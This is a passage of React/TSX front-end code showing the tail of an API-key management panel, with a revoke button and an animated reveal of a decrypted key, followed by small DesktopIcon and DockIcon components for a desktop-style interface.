                                    className="p-2 hover:bg-red-500/10 rounded-lg text-slate-500 hover:text-red-500 transition-colors"
                                    title="Revoke Key"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </button>
                                </div>
                              </div>
                              
                              <AnimatePresence>
                                {viewingDecryptedKey?.id === key.id && (
                                  <motion.div 
                                    initial={{ opacity: 0, height: 0 }}
                                    animate={{ opacity: 1, height: 'auto' }}
                                    exit={{ opacity: 0, height: 0 }}
                                    className="mx-4 mb-2 p-4 bg-black/60 border-x border-b border-slate-800 rounded-b-xl"
                                  >
                                    <div className="flex items-center gap-2 mb-2">
                                      <div className="w-1 h-1 rounded-full bg-cyan-500 animate-pulse" />
                                      <span className="text-[9px] font-mono text-cyan-500/70 border-b border-cyan-500/20">HSM_OUTPUT_DECRYPTED</span>
                                    </div>
                                    <code className="text-[10px] text-emerald-400 font-mono break-all line-clamp-3 opacity-80">
                                      {viewingDecryptedKey.text}
                                    </code>
                                  </motion.div>
                                )}
                              </AnimatePresence>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>

              <div className="p-4 bg-slate-950/50 border-t border-slate-800 text-center">
                <p className="text-[9px] text-slate-600 font-mono uppercase tracking-[0.2em]">All keys are AES-256 encrypted using System Hardware Security Module</p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const DesktopIcon: React.FC<{ icon: any, label: string, color: string, onClick?: () => void, status?: 'connected' | 'disconnected' }> = ({ icon: Icon, label, color, onClick, status }) => (
  <div onClick={onClick} className="flex flex-col items-center gap-1.5 p-2 rounded-lg hover:bg-white/5 cursor-pointer active:scale-95 transition-all group relative">
     <div className={`p-2 rounded-lg bg-black/20 border border-white/5 shadow-lg group-hover:border-white/20 ${color}`}>
        <Icon className="w-6 h-6" />
     </div>
     {status && (
       <div className={`absolute top-2 right-2 w-2 h-2 rounded-full border border-black ${status === 'connected' ? 'bg-emerald-500' : 'bg-red-500'}`} />
     )}
     <span className="text-[10px] text-white/60 font-medium tracking-tight drop-shadow-md">{label}</span>
  </div>
);

const DockIcon: React.FC<{ icon: any, onClick?: () => void, hasIndicator?: boolean }> = ({ icon: Icon, onClick, hasIndicator }) => (
  <div onClick={onClick} className="flex flex-col items-center gap-1 group cursor-pointer relative pt-1">
     <div className="p-2 rounded-xl bg-slate-800/20 hover:bg-slate-700/40 border border-white/5 hover:border-white/20 transition-all">
        <Icon className="w-5 h-5 text-white/50 group-hover:text-white" />
     </div>
     {hasIndicator && (
       <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 w-1 h-1 bg-cyan-500 rounded-full shadow-[0_0_5px_rgba(6,182,212,0.8)]" />
     )}
  </div>
);
